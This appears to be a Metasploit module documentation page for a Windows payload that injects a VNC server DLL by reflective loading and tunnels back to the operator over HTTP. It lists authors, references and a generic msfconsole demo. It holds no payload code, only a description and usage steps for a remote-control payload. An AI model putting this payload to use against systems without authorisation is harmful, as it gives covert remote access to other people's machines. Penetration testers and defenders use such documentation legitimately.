## VNC Server (Reflective Injection), Windows Reverse HTTP Stager (wininet)

Inject a VNC Dll via a reflective loader (staged). Tunnel 
communication over HTTP (Windows wininet)


## Module Name
payload/windows/vncinject/reverse_http

## Authors
* sf
* hdm


## References
* https://github.com/stephenfewer/ReflectiveDLLInjection
* https://github.com/rapid7/ReflectiveDLLInjection




## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/vncinject/reverse_http
msf payload(reverse_http) > show targets
   ... a list of targets ...
msf payload(reverse_http) > set TARGET <target-id>
msf payload(reverse_http) > show options
   ... show and set options ...
msf payload(reverse_http) > run
```
    
    